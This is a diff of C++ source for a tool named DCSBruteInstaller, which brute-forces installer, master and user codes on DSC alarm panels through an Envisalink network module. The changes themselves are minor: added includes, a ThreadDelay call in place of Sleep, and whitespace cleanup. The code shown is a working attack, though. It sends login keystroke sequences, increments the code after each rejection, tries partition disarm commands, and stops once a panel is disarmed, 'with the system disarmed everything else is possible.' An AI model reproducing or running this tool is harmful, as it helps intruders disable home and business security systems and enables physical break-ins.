@@ -22,6 +22,11 @@
 //                                                                         //
 //-------------------------------------------------------------------------*/
 
+#ifndef GUCEF_MT_DVMTOSWRAP_H
+#include "gucefMT_dvmtoswrap.h"
+#define GUCEF_MT_DVMTOSWRAP_H
+#endif /* GUCEF_MT_DVMTOSWRAP_H ? */
+
 #ifndef GUCEF_CORE_CGUCEFAPPLICATION_H
 #include "CGUCEFApplication.h"
 #define GUCEF_CORE_CGUCEFAPPLICATION_H
@@ -31,6 +36,16 @@
 #include "gucefCORE_Logging.h"
 #define GUCEF_CORE_LOGGING_H
 #endif /* GUCEF_CORE_LOGGING_H ? */
+
+#ifndef GUCEF_CORE_CDATANODE_H
+#include "CDataNode.h"
+#define GUCEF_CORE_CDATANODE_H
+#endif /* GUCEF_CORE_CDATANODE_H ? */
+
+#ifndef GUCEF_CORE_DVCPPSTRINGUTILS_H
+#include "dvcppstringutils.h"
+#define GUCEF_CORE_DVCPPSTRINGUTILS_H
+#endif /* GUCEF_CORE_DVCPPSTRINGUTILS_H ? */
 
 #ifndef GUCEF_CORE_CGLOBALCONFIGVALUELIST_H
 #include "gucefCORE_CGlobalConfigValueList.h"
@@ -114,7 +129,7 @@ class DCSBruteInstaller : public CORE::CObserver
         ATTACKTYPE_INSTALLER = 2
     };
     typedef enum EAttackType TAttackType;
-    
+
     COMCORE::CHostAddress m_envisalinkAddr;
     COMCORE::CTCPClientSocket m_tcpClientSocket;
     CORE::CString m_password;
@@ -144,11 +159,11 @@ class DCSBruteInstaller : public CORE::CObserver
         }
         return "0";
     }
-    
-    static CORE::CString 
+
+    static CORE::CString
     AppendChecksumAndCrLf( const CORE::CString& msg )
     {GUCEF_TRACE;
-        
+
         // Add every ASCII hex value as a decimal, allow overflow of byte
         // the total value is decimal since we convert to decimal before addition
         CORE::UInt8 checksum = 0;
@@ -156,7 +171,7 @@ class DCSBruteInstaller : public CORE::CObserver
         {
             checksum += (CORE::UInt8) msg[ i ];
         }
-        
+
         // grab the high and low nibble while still in decimal
         CORE::UInt8 hiChecksumNibble = HI_NIBBLE( checksum );
         CORE::UInt8 loChecksumNibble = LO_NIBBLE( checksum );
@@ -166,11 +181,11 @@ class DCSBruteInstaller : public CORE::CObserver
 
         char suffix[ 4 ] = { (char) hiChecksumNibble, (char) loChecksumNibble, '\r', '\n' };
         CORE::CString newMsg( msg );
-        newMsg.Append( suffix, 4 ); 
+        newMsg.Append( suffix, 4 );
 
         return newMsg;
     }
-    
+
     void
     OnTCPSocketDisconnected( CORE::CNotifier* notifier    ,
                              const CORE::CEvent& eventID  ,
@@ -227,7 +242,7 @@ class DCSBruteInstaller : public CORE::CObserver
                 {
                     m_ackReceivedForLastSend = false;
                     GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Sent queued message: " + m_msgQueue.front() );
-                    Sleep( 10 );
+                    MT::ThreadDelay( 10 );
                     //m_msgQueue.erase( m_msgQueue.begin() );
                     return true;
                 }
@@ -240,20 +255,20 @@ class DCSBruteInstaller : public CORE::CObserver
                 return true;
             }
         }
-        
+
         GUCEF_DEBUG_LOG( CORE::LOGLEVEL_NORMAL, "DCSBruteInstaller: There are no messages queued to be sent" );
         return true;
     }
 
     void EraseQueuedMessage( void )
-    {   
+    {
         if ( !m_msgQueue.empty() )
         {
             m_msgQueue.erase( m_msgQueue.begin() );
         }
     }
 
-    static CORE::CString 
+    static CORE::CString
     CommandToString( CORE::UInt16 command )
     {GUCEF_TRACE;
 
@@ -286,7 +301,7 @@ class DCSBruteInstaller : public CORE::CObserver
     static CORE::CString
     PassCodeToString( CORE::UInt16 passCode )
     {
-        CORE::CString codeStr = CORE::UInt16ToString( passCode ); 
+        CORE::CString codeStr = CORE::UInt16ToString( passCode );
         if ( passCode < 10 )
         {
             return "000" + codeStr;
@@ -317,24 +332,24 @@ class DCSBruteInstaller : public CORE::CObserver
 
     void SendMasterCodeSingleStroke( void )
     {GUCEF_TRACE;
-        
+
         // Prepare the master code string
         // this has the command code 071 which is multiple key presses
         // followed by *5 which means login as master user
         // followed by the 4-6 digit master code
-        
-        CORE::CString codeStr = PassCodeToString( m_masterCode ); 
+
+        CORE::CString codeStr = PassCodeToString( m_masterCode );
         CORE::CString msg = "*5" + codeStr + '#';
-        
+
         for ( CORE::UInt32 i=0; i<msg.Length(); ++i )
-        {                
+        {
             CORE::CString keyStrokeMsg( "070" );
             keyStrokeMsg += msg[ i ];
 
             QueueMessage( keyStrokeMsg );
             GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued keystroke " + CORE::CString( msg[i] ) + " for master login with code " + codeStr );
         }
-        
+
         if ( SendQueuedMessage() )
         {
             GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Starting to send keystrokes for master login with code " + codeStr );
@@ -342,12 +357,12 @@ class DCSBruteInstaller : public CORE::CObserver
         else
         {
             GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Failed to send first keystroke for master login with code " + codeStr );
-        }         
+        }
     }
 
     void SendMasterCode( void )
     {GUCEF_TRACE;
-        
+
         if ( m_sendIndividualKeystrokes )
         {
             SendMasterCodeSingleStroke();
@@ -358,10 +373,10 @@ class DCSBruteInstaller : public CORE::CObserver
             // this has the command code 071 which is multiple key presses
             // followed by *5 which means login as master user
             // followed by the 4-6 digit master code
-        
-            CORE::CString codeStr = PassCodeToString( m_masterCode ); 
+
+            CORE::CString codeStr = PassCodeToString( m_masterCode );
             CORE::CString msg = "071*5" + codeStr + '#';
-        
+
             QueueMessage( msg );
             GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued master login with code " + codeStr );
             SendQueuedMessage();
@@ -373,33 +388,33 @@ class DCSBruteInstaller : public CORE::CObserver
         CORE::CString codeStr = PassCodeToString( m_masterCode );
         CORE::CString partStr = CORE::UInt16ToString( partition );
         CORE::CString msg = "040" + CORE::UInt16ToString( partition ) + codeStr;
-        
+
         QueueMessage( msg );
-        
+
         GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Sending Partition Disarm for partition " + partStr + " with code " + codeStr );
         SendQueuedMessage();
     }
 
     void SendInstallerCodeSingleStroke( void )
     {GUCEF_TRACE;
-        
+
         // Prepare the installer code string
         // this has the command code 071 which is multiple key presses
         // followed by *8 which means login as installer
         // followed by the 4-6 digit installer code
-        
-        CORE::CString codeStr = PassCodeToString( m_installerCode ); 
+
+        CORE::CString codeStr = PassCodeToString( m_installerCode );
         CORE::CString msg = "*8" + codeStr + '#';
-        
+
         for ( CORE::UInt32 i=0; i<msg.Length(); ++i )
-        {                
+        {
             CORE::CString keyStrokeMsg( "070" );
             keyStrokeMsg += msg[ i ];
 
             QueueMessage( keyStrokeMsg );
             GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued keystroke " + CORE::CString( msg[i] ) + " for installer login with code " + codeStr );
         }
-        
+
         if ( SendQueuedMessage() )
         {
             GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Starting to send keystrokes for installer login with code " + codeStr );
@@ -407,7 +422,7 @@ class DCSBruteInstaller : public CORE::CObserver
         else
         {
             GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Failed to send first keystroke for installer login with code " + codeStr );
-        }         
+        }
     }
 
     void SendInstallerCode( void )
@@ -423,10 +438,10 @@ class DCSBruteInstaller : public CORE::CObserver
             // this has the command code 071 which is multiple key presses
             // followed by *8 which means login as installer
             // followed by the 4 digit installer code
-        
-            CORE::CString codeStr = PassCodeToString( m_installerCode ); 
+
+            CORE::CString codeStr = PassCodeToString( m_installerCode );
             CORE::CString msg = "071*8" + codeStr + '#';
-        
+
             QueueMessage( msg );
             GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued installer login with code " + codeStr );
             SendQueuedMessage();
@@ -458,7 +473,7 @@ class DCSBruteInstaller : public CORE::CObserver
             }
             else
             {
-                CORE::CString flippedNibbleStr = hexTimerValue.SubstrFromRange( 2, 4 ) + hexTimerValue.SubstrFromRange( 0, 2 );                
+                CORE::CString flippedNibbleStr = hexTimerValue.SubstrFromRange( 2, 4 ) + hexTimerValue.SubstrFromRange( 0, 2 );
                 CORE::UInt32 timerValue = 0;
                 sscanf( flippedNibbleStr.C_String(), "%x", &timerValue);
 
@@ -483,9 +498,9 @@ class DCSBruteInstaller : public CORE::CObserver
     void
     OnMessageReceived( const CORE::CString& msg )
     {GUCEF_TRACE;
-        
+
         GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Received msg: " + msg );
-        
+
         CORE::UInt16 command = CORE::StringToUInt16( msg.SubstrFromRange( 0, 3 ) );
         switch ( command )
         {
@@ -529,7 +544,7 @@ class DCSBruteInstaller : public CORE::CObserver
                         GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Transmit Buffer Overrun" );
                         m_ackReceivedForLastSend = true;
 
-                        Sleep( 20 );
+                        MT::ThreadDelay( 20 );
                         SendQueuedMessage();
                         break;
                     }
@@ -645,7 +660,7 @@ class DCSBruteInstaller : public CORE::CObserver
                     case '1':
                     {
                         GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink Password is accepted, session established" );
-                        
+
                         if ( m_requestSystemInfo )
                         {
                             SendStatusReportRequest();
@@ -761,7 +776,7 @@ class DCSBruteInstaller : public CORE::CObserver
                 CORE::UInt16 partitionId = CORE::StringToUInt16( partitionStr );
 
                 GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us partition " + partitionStr + " is armed as type " + GetArmTypeString( msg.SubstrFromRange( 4, 5 ) ) );
-                
+
                 m_ackReceivedForLastSend = true;
                 SendQueuedMessage();
                 break;
@@ -775,7 +790,7 @@ class DCSBruteInstaller : public CORE::CObserver
                 {
                     case ATTACKTYPE_INSTALLER: { ++m_installerCode; SendInstallerCode(); break; }
                     case ATTACKTYPE_USER: { ++m_masterCode; SendPartitionDisarm(); break; }
-                }                
+                }
                 break;
             }
             case 671:
@@ -816,7 +831,7 @@ class DCSBruteInstaller : public CORE::CObserver
                 CORE::UInt16 partitionId = CORE::StringToUInt16( partitionStr );
 
                 // This could mean we have found he user code for a user Id!!!
-                GUCEF_LOG( CORE::LOGLEVEL_CRITICAL, "DCSBruteInstaller: Envisalink tells us User Closing, A partition has been armed by a user – sent at the end of exit delay, for partition " + partitionStr + " with userId " + msg.SubstrFromRange( 4, 8 ) + ". The current last user code was " + CORE::UInt16ToString( m_masterCode ) );                
+                GUCEF_LOG( CORE::LOGLEVEL_CRITICAL, "DCSBruteInstaller: Envisalink tells us User Closing, A partition has been armed by a user – sent at the end of exit delay, for partition " + partitionStr + " with userId " + msg.SubstrFromRange( 4, 8 ) + ". The current last user code was " + CORE::UInt16ToString( m_masterCode ) );
             }
             case 750 :
             {
@@ -836,7 +851,7 @@ class DCSBruteInstaller : public CORE::CObserver
                     }
                     else
                     {
-                        // Since 1 user code is enough to disarm the system we will leave it at that 
+                        // Since 1 user code is enough to disarm the system we will leave it at that
                         // with the system disarmed everything else is possible.
                         m_currentAttack = ATTACKTYPE_NONE;
                         CORE::CCoreGlobal::Instance()->GetApplication().Stop();
@@ -890,7 +905,7 @@ class DCSBruteInstaller : public CORE::CObserver
     {GUCEF_TRACE;
 
         if ( 0 == eventData ) return;
-        
+
         COMCORE::CTCPClientSocket::TDataRecievedEventData* eData = static_cast< COMCORE::CTCPClientSocket::TDataRecievedEventData* >( eventData );
         const CORE::CDynamicBuffer& buffer = eData->GetData();
 
@@ -899,7 +914,7 @@ class DCSBruteInstaller : public CORE::CObserver
         CORE::CString messages( buffer.AsConstTypePtr< char >(), buffer.GetDataSize() );
         messages = messages.ReplaceChar( '\r', '\n' );
         TStringVector msgLines = messages.ParseElements( '\n', false );
-        
+
         TStringVector::iterator i = msgLines.begin();
         while ( i != msgLines.end() )
         {
@@ -1016,7 +1031,7 @@ class DCSBruteInstaller : public CORE::CObserver
         if ( !valueStr.IsNULLOrEmpty() )
         {
             m_attackInstaller = CORE::StringToBool( valueStr );
-        }        
+        }
 
         CORE::CString tcpPortStr = keyValueList.GetValueAlways( "TcpPort" );
         if ( !tcpPortStr.IsNULLOrEmpty() )
@@ -1036,9 +1051,9 @@ class DCSBruteInstaller : public CORE::CObserver
         if ( !valueStr.IsNULLOrEmpty() )
         {
             m_sendIndividualKeystrokes = CORE::StringToBool( valueStr );
-        }        
+        }
 
-        m_password = keyValueList.GetValueAlways( "Password" ); 
+        m_password = keyValueList.GetValueAlways( "Password" );
 
         return m_tcpClientSocket.ConnectTo( m_envisalinkAddr, false );
     }
@@ -1088,19 +1103,19 @@ LookForConfigFile( const CORE::CString& configFile )
 
             GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "Checking for config file @ " + configFilePath );
             if ( !FileExists( configFilePath ) )
-            {            
+            {
                 configFilePath = CORE::CombinePath( "$TEMPDIR$", configFile );
                 configFilePath = CORE::RelativePath( configFilePath );
 
                 GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "Checking for config file @ " + configFilePath );
                 if ( !FileExists( configFilePath ) )
-                {                                        
+                {
                     return CORE::CString::Empty;
                 }
             }
         }
 
-        return configFilePath; 
+        return configFilePath;
     }
 
     return configFile;
@@ -1124,7 +1139,7 @@ LoadConfig( const CORE::CString& bootstrapConfigPath   ,
     #endif
 
     CORE::CConfigStore& configStore = CORE::CCoreGlobal::Instance()->GetConfigStore();
-    
+
     CORE::CString bootstrapConfigFilePath = LookForConfigFile( bootstrapConfigFile );
     CORE::CString configFilePath = LookForConfigFile( configFile );
 
@@ -1144,7 +1159,7 @@ LoadConfig( const CORE::CString& bootstrapConfigPath   ,
     }
 
     CORE::CGlobalConfigValueList globalCfg;
-    globalCfg.SetConfigNamespace( "Main/AppArgs" );    
+    globalCfg.SetConfigNamespace( "Main/AppArgs" );
     globalCfg.SetAllowDuplicates( false );
     globalCfg.SetAllowMultipleValues( true );
 
@@ -1187,10 +1202,10 @@ ParseParams( const int argc                 ,
  */
 GUCEF_OSMAIN_BEGIN
 {GUCEF_TRACE;
-    
+
     CORE::CString test = DCSBruteInstaller::AppendChecksumAndCrLf( "000" );
      test = DCSBruteInstaller::AppendChecksumAndCrLf( "071*8000" );
-    
+
     GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "This tool was compiled on: " __DATE__ " @ " __TIME__ );
 
     CORE::CCoreGlobal::Instance();
